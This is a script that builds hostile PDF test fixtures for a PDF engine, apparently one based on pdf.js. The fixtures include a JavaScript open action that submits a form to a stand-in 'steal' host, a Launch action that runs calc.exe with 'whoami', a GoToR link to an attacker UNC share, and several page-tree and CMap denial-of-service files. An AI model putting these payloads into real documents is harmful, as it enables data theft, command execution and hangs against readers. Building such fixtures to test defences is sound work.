import { mkdir, writeFile } from 'node:fs/promises';
import { URL } from 'node:url';
import { HELVETICA, pdf, stream, textPage } from '../corpus/pdf-writer.mjs';

// Hostile PDFs: JavaScript open action, launch and remote actions, an xref loop, a 100,000-page
// tree built from shared nodes, and a page tree nested 2,000 deep. None may run, fetch or hang.
const directory = new URL('../../hostile/pdf/', import.meta.url);
await mkdir(directory, { recursive: true });

// One unused malformed kid rejects during prefetch, before the caller can observe its promise (#206).
await writeFile(
  new URL('unused-malformed-page-kid.pdf', directory),
  pdf(
    [
      '<< /Type /Catalog /Pages 2 0 R >>',
      '<< /Type /Pages /Kids [3 0 R 4 0 R] /Count 1 >>',
      '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>',
      '<< /Type /Page /Bad ) >>',
    ],
    '/Root 1 0 R',
  ),
);

await writeFile(
  new URL('missing-outline-page.pdf', directory),
  pdf(
    [
      '<< /Type /Catalog /Pages 2 0 R /Outlines 6 0 R >>',
      '<< /Type /Pages /Kids [3 0 R 4 0 R] /Count 1 >>',
      '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>',
      '42',
      '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>',
      '<< /Type /Outlines /First 7 0 R /Last 7 0 R /Count 1 >>',
      '<< /Title (Missing target page) /Parent 6 0 R /Dest [5 0 R /Fit] >>',
    ],
    '/Root 1 0 R',
  ),
);

const page = (parent, contents, extra = '') =>
  `<< /Type /Page /Parent ${parent} 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 3 0 R >> >> /Contents ${contents} 0 R${extra} >>`;

// 1 catalog with a JavaScript open action and document-level JavaScript.
await writeFile(
  new URL('openaction-javascript.pdf', directory),
  pdf(
    [
      '<< /Type /Catalog /Pages 2 0 R /OpenAction 6 0 R /Names << /JavaScript << /Names [(init) 7 0 R] >> >> >>',
      '<< /Type /Pages /Kids [4 0 R] /Count 1 >>',
      HELVETICA,
      page(2, 5, ' /AA << /O 6 0 R >>'),
      stream(textPage(['Opening this file must not run anything.'])),
      "<< /S /JavaScript /JS (app.alert('run'); this.submitForm('https://example.invalid/steal');) >>",
      "<< /S /JavaScript /JS (app.launchURL('https://example.invalid/', true);) >>",
    ],
    '/Root 1 0 R',
  ),
);

// Launch and GoToR actions on links: reported, never followed.
await writeFile(
  new URL('launch-and-remote.pdf', directory),
  pdf(
    [
      '<< /Type /Catalog /Pages 2 0 R >>',
      '<< /Type /Pages /Kids [4 0 R] /Count 1 >>',
      HELVETICA,
      page(2, 5, ' /Annots [6 0 R 7 0 R]'),
      stream(textPage(['Launch a program', 'Open a remote file'])),
      '<< /Type /Annot /Subtype /Link /Rect [70 755 300 775] /A << /S /Launch /F (C:\\\\Windows\\\\System32\\\\calc.exe) /Win << /F (calc.exe) /P (/c whoami) >> >> >>',
      '<< /Type /Annot /Subtype /Link /Rect [70 739 300 759] /A << /S /GoToR /F (\\\\\\\\attacker.invalid\\\\share\\\\doc.pdf) /D [0 /Fit] >> >>',
    ],
    '/Root 1 0 R',
  ),
);

// The trailer's /Prev points at its own cross-reference section.
await writeFile(
  new URL('xref-loop.pdf', directory),
  pdf(
    [
      '<< /Type /Catalog /Pages 2 0 R >>',
      '<< /Type /Pages /Kids [4 0 R] /Count 1 >>',
      HELVETICA,
      page(2, 5),
      stream(textPage(['A trailer that points at itself.'])),
    ],
    '/Root 1 0 R',
    { prevSelf: true },
  ),
);

// 100,000 pages from five levels of shared /Pages nodes, each with ten references to the next.
{
  const levels = 5;
  const objects = ['<< /Type /Catalog /Pages 2 0 R >>'];
  // Objects 2..6 are the five levels; 7 font, 8 page, 9 contents.
  for (let level = 0; level < levels; level++) {
    const self = 2 + level;
    const child = level === levels - 1 ? 8 : self + 1;
    const count = 10 ** (levels - level);
    const parent = level === 0 ? '' : ` /Parent ${self - 1} 0 R`;
    objects.push(
      `<< /Type /Pages${parent} /Kids [${Array.from({ length: 10 }, () => `${child} 0 R`).join(' ')}] /Count ${count} >>`,
    );
  }
  objects.push(HELVETICA);
  objects.push(
    '<< /Type /Page /Parent 6 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 7 0 R >> >> /Contents 9 0 R >>',
  );
  objects.push(stream(textPage(['One page object, shared 100,000 times.'])));
  await writeFile(new URL('pages-100000-shared.pdf', directory), pdf(objects, '/Root 1 0 R'));
}

// A page tree nested 2,000 deep with one page at the bottom.
{
  const depth = 2_000;
  const objects = ['<< /Type /Catalog /Pages 2 0 R >>'];
  for (let level = 0; level < depth; level++) {
    const self = 2 + level;
    const kid = level === depth - 1 ? depth + 3 : self + 1;
    const parent = level === 0 ? '' : ` /Parent ${self - 1} 0 R`;
    objects.push(`<< /Type /Pages${parent} /Kids [${kid} 0 R] /Count 1 >>`);
  }
  objects.push(HELVETICA); // object depth + 2
  objects.push(
    `<< /Type /Page /Parent ${depth + 1} 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 ${depth + 2} 0 R >> >> /Contents ${depth + 4} 0 R >>`,
  );
  objects.push(stream(textPage(['At the bottom of a deep page tree.'])));
  await writeFile(new URL('deep-page-tree-2000.pdf', directory), pdf(objects, '/Root 1 0 R'));
}

// ToUnicode CMaps whose ranges claim millions of codes (#262). pdf.js expands each range into an
// array; the build patch caps each CMap at 65,536 codes and the pdfFonts limit caps the fonts.
{
  const toUnicode = (ranges) =>
    stream(
      [
        '/CIDInit /ProcSet findresource begin 12 dict begin begincmap',
        '1 begincodespacerange <00000000> <FFFFFFFF> endcodespacerange',
        ...ranges.map(([low, high]) => `1 beginbfrange <${low}> <${high}> <0041> endbfrange`),
        'endcmap CMapName currentdict /CMap defineresource pop end end',
      ].join('\n'),
    );
  const fontsPage = (fonts, cmapRanges, file) => {
    // 1 catalog, 2 pages, 3 page, 4 contents, 5 ToUnicode (when given), 6.. fonts.
    const names = Array.from({ length: fonts }, (_, index) => `/F${index} ${6 + index} 0 R`);
    const shows = Array.from({ length: fonts }, (_, index) => `/F${index} 12 Tf (A) Tj`);
    const font = cmapRanges
      ? '<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /ToUnicode 5 0 R >>'
      : HELVETICA;
    return writeFile(
      new URL(file, directory),
      pdf(
        [
          '<< /Type /Catalog /Pages 2 0 R >>',
          '<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
          `<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << ${names.join(' ')} >> >> /Contents 4 0 R >>`,
          stream(`BT 72 720 Td ${shows.join(' ')} ET`),
          cmapRanges ? toUnicode(cmapRanges) : '<< >>',
          ...Array.from({ length: fonts }, () => font),
        ],
        '/Root 1 0 R',
      ),
    );
  };
  const block = (high) => [`${high}000000`, `${high}FFFFFE`];
  await fontsPage(1, [block('00')], 'cmap-range-16m.pdf');
  await fontsPage(1, [block('00'), block('01')], 'cmap-two-ranges-16m.pdf');
  await fontsPage(4, [block('00')], 'cmap-shared-four-fonts.pdf');
  // 512 valid 256-code ranges: the first 256 fit the 65,536-code cap, the rest are dropped.
  const small = Array.from({ length: 512 }, (_, index) => {
    const prefix = index.toString(16).padStart(6, '0');
    return [`${prefix}00`, `${prefix}FF`];
  });
  await fontsPage(1, small, 'cmap-ranges-over-cap.pdf');
  // One code at 0xFFFFFF: pdf.js would copy the CMap into an array of 16.7 million slots.
  await fontsPage(1, [['00FFFFFF', '00FFFFFF']], 'cmap-high-code.pdf');
  // 300 fonts on one page: past the default pdfFonts limit of 256.
  await fontsPage(300, undefined, 'fonts-300.pdf');
}

// Encryption the engine cannot open (PDF-5): a public-key security handler and an unknown
// algorithm version. Both must fail with EncryptedError('unsupported-encryption').
for (const [file, encrypt] of [
  ['encrypt-public-key.pdf', '<< /Filter /Adobe.PubSec /SubFilter /adbe.pkcs7.s5 /V 4 /R 4 /Length 128 >>'],
  [
    'encrypt-unknown-version.pdf',
    '<< /Filter /Standard /V 9 /R 9 /Length 128 /P -4 /O <00> /U <00> >>',
  ],
]) {
  await writeFile(
    new URL(file, directory),
    pdf(
      [
        '<< /Type /Catalog /Pages 2 0 R >>',
        '<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
        '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>',
        encrypt,
      ],
      '/Root 1 0 R /Encrypt 4 0 R /ID [<0123456789abcdef0123456789abcdef> <0123456789abcdef0123456789abcdef>]',
    ),
  );
}
